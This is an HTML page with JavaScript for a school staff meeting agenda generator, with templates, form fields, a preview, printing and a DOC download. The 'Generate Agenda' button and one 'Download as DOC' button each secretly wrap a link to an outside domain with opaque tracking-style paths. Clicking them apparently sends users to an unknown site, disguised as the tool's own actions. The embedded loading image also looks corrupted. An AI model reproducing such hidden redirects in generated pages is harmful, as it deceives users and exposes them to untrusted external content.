<html lang="en"><head><meta charset="UTF-8"></meta><meta content="width=device-width,initial-scale=1.0" name="viewport"></meta><title>School Staff Meeting Agenda Generator</title><style>body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;line-height:1.6;color:#333;max-width:900px;margin:0 auto;padding:20px;background-color:#f5f5f5}h1{color:#2c3e50;text-align:center;margin-bottom:30px;border-bottom:2px solid #3498db;padding-bottom:10px}.container{background-color:#fff;border-radius:8px;box-shadow:0 0 15px rgba(0,0,0,0.1);padding:25px}.form-group{margin-bottom:20px}label{display:block;margin-bottom:8px;font-weight:600}input[type="text"],input[type="date"],input[type="time"],select,textarea{width:100%;padding:10px;border:1px solid #ddd;border-radius:4px;font-size:16px}textarea{min-height:100px;resize:vertical}.btn{background-color:#3498db;color:#fff;border:none;padding:10px 20px;font-size:16px;border-radius:4px;cursor:pointer;transition:background-color 0.3s}.btn:hover{background-color:#2980b9}.btn-secondary{background-color:#95a5a6;margin-left:10px}.btn-secondary:hover{background-color:#7f8c8d}.agenda-item{background-color:#f9f9f9;padding:15px;border-radius:5px;margin-bottom:15px;border-left:4px solid #3498db}.remove-item{background-color:#e74c3c;color:white;border:none;padding:5px 10px;border-radius:3px;cursor:pointer;float:right}.remove-item:hover{background-color:#c0392b}#agendaPreview{background-color:#f9f9f9;padding:20px;border-radius:5px;margin-top:30px;border:1px dashed #ccc}#downloadBtn{margin-top:20px}.hidden{display:none}.file-upload{display:flex;align-items:center;margin-top:10px}.file-upload input[type="file"]{flex:1;padding:5px}.template-selector{margin-bottom:20px}.template-selector select{margin-bottom:10px}#loading{text-align:center;margin:20px 0}#loading img{width:50px}.agenda-header{text-align:center;margin-bottom:20px}.agenda-header h2{margin-bottom:5px}.agenda-header p{margin-top:0;color:#666}.agenda-topic{margin-bottom:15px;page-break-inside:avoid}.agenda-topic h3{border-bottom:1px solid #eee;padding-bottom:5px;margin-bottom:5px}.agenda-topic p{margin:5px 0}.signature-line{margin-top:50px;border-top:1px solid #000;width:200px;display:inline-block;margin-right:50px}.signature-label{font-style:italic;margin-top:5px}@media print{body{background-color:#fff}.container{box-shadow:none;padding:0}.no-print{display:none}#agendaPreview{padding:0;border:none}@page{margin:1cm}}</style></head><body><div class="container"><h1>School Staff Meeting Agenda Generator</h1><div class="template-selector"><label for="template">Select Template:</label><select class="form-control" id="template"><option value="custom">Custom Agenda</option><option value="discipline">School Discipline Issues</option><option value="academic">Academic Issues</option><option value="administration">Administration Issues</option><option value="management">Management Issues</option><option value="examination">Examination &amp; Assessment</option></select></div><div id="customForm"><div class="form-group"><label for="schoolName">School Name:</label><input id="schoolName" placeholder="Enter school name" type="text" /></div><div class="form-group"><label for="meetingTitle">Meeting Title:</label><input id="meetingTitle" placeholder="Enter meeting title" type="text" /></div><div class="form-group"><label for="meetingDate">Date:</label><input id="meetingDate" type="date" /></div><div class="form-group"><label for="meetingTime">Time:</label><input id="meetingTime" type="time" /></div><div class="form-group"><label for="meetingLocation">Location:</label><input id="meetingLocation" placeholder="Enter meeting location" type="text" /></div><div class="form-group"><label for="meetingChair">Chairperson:</label><input id="meetingChair" placeholder="Enter chairperson's name" type="text" /></div><div class="form-group"><label for="meetingSecretary">Secretary:</label><input id="meetingSecretary" placeholder="Enter secretary's name" type="text" /></div><div id="agendaItems"><div class="agenda-item"><label>Agenda Item 1:</label><div class="form-group"><input class="itemTitle" placeholder="Item title" type="text" /></div><div class="form-group"><textarea class="itemDescription" placeholder="Item description"></textarea></div><div class="form-group"><input class="itemPresenter" placeholder="Presenter name" type="text" /></div><div class="form-group"><input class="itemDuration" placeholder="Duration (e.g., 15 mins)" type="text" /></div><button class="remove-item" onclick="removeAgendaItem(this)">Remove</button></div></div><div class="form-group"><button class="btn" onclick="addAgendaItem()">Add Agenda Item</button></div><div class="form-group"><label for="additionalNotes">Additional Notes:</label><textarea id="additionalNotes" placeholder="Any additional notes for the meeting"></textarea></div><div class="form-group file-upload"><label for="attachment">Upload Attachment:</label><input id="attachment" type="file" /></div><div class="form-group"><button class="btn" onclick="generateAgenda()"><a href="https://essentialmost.com/AbJdyf">Generate Agenda</a></button><button class="btn btn-secondary" onclick="clearForm()">Clear Form</button></div></div><div class="hidden" id="loading"><img alt="Loading..." src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCGFwZT0icmVwZWF0IiB3aWR0aD0iMjAwIiBoZWlnaHQ9IjIwMCI+PHBhdGggZD0iTTEwMCAzMEM1NS44IDMwIDMwIDU1LjggMzAgMTAwYzAgMTEuMyAzLjEgMjEuOCA4LjQgMzAuOGwuNi0uNkMzNS4xIDEyMS4zIDMyIDExMS4zIDMyIDEwMEMzMiA2MS4xIDYxLjEgMzIgMTAwIDMyYzM4LjkgMCA3MCAzMS4xIDcwIDcwIDAgMTEuMy0zLjEgMjEuOC04LjQgMzAuOGwuNi42YzUuMy05IDguNC0xOS41IDguNC0zMC44QzE3MCA1NS44IDE0NC4yIDMwIDEwMCAzMHoiIGZpbGw9IiMzNDk4ZGIiPjxhbmltYXRlVHJhbnNmb3JtIGF0dHJpYnV0ZU5hbWU9InRyYW5zZm9ybSIgdHlwZT0icm90YXRlIiBmcm9tPSIwIDEwMCAxMDAiIHRvPSIzNjAgMTAwIDEwMCIgZHVyPSIxcyIgcmVwZWF0Q291bnQ9ImluZGVmaW5pdGUiLz48L3BhdGg+PC9zdmc+" /><p>Generating agenda...</p></div><div class="hidden" id="agendaPreview"><div class="no-print"><h2>Agenda Preview</h2><button class="btn" onclick="printAgenda()">Print Agenda</button><button class="btn btn-secondary" onclick="downloadAgenda()">Download as DOC</button><button class="btn btn-secondary" onclick="backToForm()">Back to Editor</button></div><div id="previewContent"></div><div class="no-print"><button class="btn" onclick="printAgenda()">Print Agenda</button><button class="btn btn-secondary" onclick="downloadAgenda()"><a href="https://essentialmost.com/be3/V-0.PN3WplvsbFmLVpJuZLDy0/2yNOTfE_2/MQDJAc4TLpTYYP1/MpTrYEw/MADnkv">Download as DOC</a></button><button class="btn btn-secondary" onclick="backToForm()">Back to Editor</button></div></div></div><script>const templates={discipline:{title:"Staff Meeting on Discipline Issues",items:[{title:"Review of Current Discipline Policies",description:"Discuss effectiveness of current discipline policies and identify areas for improvement",presenter:"Discipline Master",duration:"20 mins"},{title:"Behavioral Issues Update",description:"Report on recent behavioral incidents and trends",presenter:"Class Teachers",duration:"15 mins per teacher"},{title:"Proposed Interventions",description:"Brainstorm and propose new interventions for recurring discipline problems",presenter:"All Staff",duration:"30 mins"}]},academic:{title:"Academic Progress Meeting",items:[{title:"Term Academic Performance Review",description:"Review overall academic performance for the term",presenter:"Academic Head",duration:"25 mins"},{title:"Subject Area Challenges",description:"Identify challenges in specific subject areas and propose solutions",presenter:"Subject Heads",duration:"20 mins"},{title:"Teaching Methodologies",description:"Share successful teaching strategies and innovations",presenter:"Selected Teachers",duration:"30 mins"}]},administration:{title:"Administrative Staff Meeting",items:[{title:"Administrative Processes Review",description:"Evaluate current administrative workflows and identify bottlenecks",presenter:"Administrator",duration:"20 mins"},{title:"Resource Allocation",description:"Discuss allocation of school resources for next term",presenter:"Bursar",duration:"15 mins"},{title:"Staff Welfare Matters",description:"Address any staff welfare issues and concerns",presenter:"Staff Representative",duration:"25 mins"}]},management:{title:"School Management Meeting",items:[{title:"Strategic Planning",description:"Discuss long-term strategic goals for the school",presenter:"Principal",duration:"30 mins"},{title:"Budget Review",description:"Review current budget status and projections",presenter:"Bursar",duration:"20 mins"},{title:"Infrastructure Development",description:"Plan for upcoming infrastructure projects and maintenance",presenter:"Facilities Manager",duration:"25 mins"}]},examination:{title:"Examination and Assessment Meeting",items:[{title:"Examination Results Analysis",description:"Analyze recent examination results and identify trends",presenter:"Examination Officer",duration:"25 mins"},{title:"Assessment Policy Review",description:"Review current assessment policies and procedures",presenter:"Academic Head",duration:"20 mins"},{title:"Preparation for Upcoming Exams",description:"Plan logistics and preparation for next examination period",presenter:"All Staff",duration:"30 mins"}]}};document.getElementById('template').addEventListener('change',function(){const templateId=this.value;if(templateId!=='custom'){applyTemplate(templateId);document.getElementById('meetingTitle').value=templates[templateId].title}});function applyTemplate(templateId){clearAgendaItems();const template=templates[templateId];template.items.forEach((item,index)=>{addAgendaItem();const itemDiv=document.getElementById('agendaItems').children[index];itemDiv.querySelector('.itemTitle').value=item.title;itemDiv.querySelector('.itemDescription').value=item.description;itemDiv.querySelector('.itemPresenter').value=item.presenter;itemDiv.querySelector('.itemDuration').value=item.duration})}function addAgendaItem(){const itemsContainer=document.getElementById('agendaItems');const itemCount=itemsContainer.children.length+1;const newItem=document.createElement('div');newItem.className='agenda-item';newItem.innerHTML=`<label>Agenda Item ${itemCount}:</label><div class="form-group"><input type="text" class="itemTitle" placeholder="Item title"></div><div class="form-group"><textarea class="itemDescription" placeholder="Item description"></textarea></div><div class="form-group"><input type="text" class="itemPresenter" placeholder="Presenter name"></div><div class="form-group"><input type="text" class="itemDuration" placeholder="Duration (e.g., 15 mins)"></div><button class="remove-item" onclick="removeAgendaItem(this)">Remove</button>`;itemsContainer.appendChild(newItem)}function removeAgendaItem(button){const item=button.parentNode;item.parentNode.removeChild(item);updateAgendaItemNumbers()}function updateAgendaItemNumbers(){const items=document.getElementById('agendaItems').children;for(let i=0;i<items.length;i++){items[i].querySelector('label').textContent=`Agenda Item ${i+1}:`}}function clearAgendaItems(){document.getElementById('agendaItems').innerHTML='';addAgendaItem()}function clearForm(){document.getElementById('schoolName').value='';document.getElementById('meetingTitle').value='';document.getElementById('meetingDate').value='';document.getElementById('meetingTime').value='';document.getElementById('meetingLocation').value='';document.getElementById('meetingChair').value='';document.getElementById('meetingSecretary').value='';document.getElementById('additionalNotes').value='';document.getElementById('attachment').value='';document.getElementById('template').value='custom';clearAgendaItems()}function generateAgenda(){document.getElementById('customForm').classList.add('hidden');document.getElementById('loading').classList.remove('hidden');setTimeout(()=>{document.getElementById('loading').classList.add('hidden');document.getElementById('agendaPreview').classList.remove('hidden');const schoolName=document.getElementById('schoolName').value||'[School Name]';const meetingTitle=document.getElementById('meetingTitle').value||'Staff Meeting';const meetingDate=document.getElementById('meetingDate').value||'[Date]';const meetingTime=document.getElementById('meetingTime').value||'[Time]';const meetingLocation=document.getElementById('meetingLocation').value||'[Location]';const meetingChair=document.getElementById('meetingChair').value||'[Chairperson]';const meetingSecretary=document.getElementById('meetingSecretary').value||'[Secretary]';const additionalNotes=document.getElementById('additionalNotes').value;let formattedDate='[Date]';if(meetingDate){const dateObj=new Date(meetingDate);formattedDate=dateObj.toLocaleDateString('en-US',{weekday:'long',year:'numeric',month:'long',day:'numeric'})}let formattedTime='[Time]';if(meetingTime){const timeParts=meetingTime.split(':');let hours=parseInt(timeParts[0]);const minutes=timeParts[1];const ampm=hours>=12?'PM':'AM';hours=hours%12;hours=hours?hours:12;formattedTime=`${hours}:${minutes} ${ampm}`}let agendaItemsHTML='';const items=document.getElementById('agendaItems').children;for(let i=0;i<items.length;i++){const title=items[i].querySelector('.itemTitle').value;const description=items[i].querySelector('.itemDescription').value;const presenter=items[i].querySelector('.itemPresenter').value;const duration=items[i].querySelector('.itemDuration').value;if(title){agendaItemsHTML+=`<div class="agenda-topic"><h3>${i+1}. ${title}</h3><p><strong>Presenter:</strong> ${presenter||'TBD'}</p><p><strong>Duration:</strong> ${duration||'TBD'}</p><p><strong>Discussion:</strong> ${description||'To be discussed'}</p></div>`}}const previewContent=document.getElementById('previewContent');previewContent.innerHTML=`<div class="agenda-header"><h2>${schoolName}</h2><h3>${meetingTitle}</h3><p><strong>Date:</strong> ${formattedDate} | <strong>Time:</strong> ${formattedTime} | <strong>Location:</strong> ${meetingLocation}</p><p><strong>Chairperson:</strong> ${meetingChair} | <strong>Secretary:</strong> ${meetingSecretary}</p></div><div class="agenda-items">${agendaItemsHTML}</div>${additionalNotes?`<div class="agenda-notes"><h3>Additional Notes:</h3><p>${additionalNotes.replace(/\n/g,'<br>')}</p></div>`:''}<div class="signature-section"><div class="signature-line"></div><span class="signature-label">Chairperson's Signature</span><div class="signature-line"></div><span class="signature-label">Secretary's Signature</span></div>`},500)}function backToForm(){document.getElementById('agendaPreview').classList.add('hidden');document.getElementById('customForm').classList.remove('hidden')}function printAgenda(){window.print()}function downloadAgenda(){const content=document.getElementById('previewContent').innerHTML;const schoolName=document.getElementById('schoolName').value||'School_Meeting_Agenda';const meetingTitle=document.getElementById('meetingTitle').value||'Staff_Meeting';const date=document.getElementById('meetingDate').value||'';let fileName=`${schoolName.replace(/\s+/g,'_')}_${meetingTitle.replace(/\s+/g,'_')}`;if(date){fileName+=`_${date}`}const htmlContent=`<!DOCTYPE html><html><head><meta charset="UTF-8"><title>${meetingTitle}</title><style>body{font-family:Arial,sans-serif;line-height:1.6;margin:2cm}h2,h3{color:#2c3e50}.agenda-topic{margin-bottom:20px;page-break-inside:avoid}.agenda-topic h3{border-bottom:1px solid #eee;padding-bottom:5px}.signature-line{margin-top:50px;border-top:1px solid #000;width:200px;display:inline-block;margin-right:50px}.signature-label{font-style:italic;margin-top:5px}@page{margin:1.5cm}</style></head><body>${content}</body></html>`;const blob=new Blob([htmlContent],{type:'application/msword'});const url=URL.createObjectURL(blob);const a=document.createElement('a');a.href=url;a.download=`${fileName}.doc`;document.body.appendChild(a);a.click();document.body.removeChild(a);URL.revokeObjectURL(url)}</script></body></html>
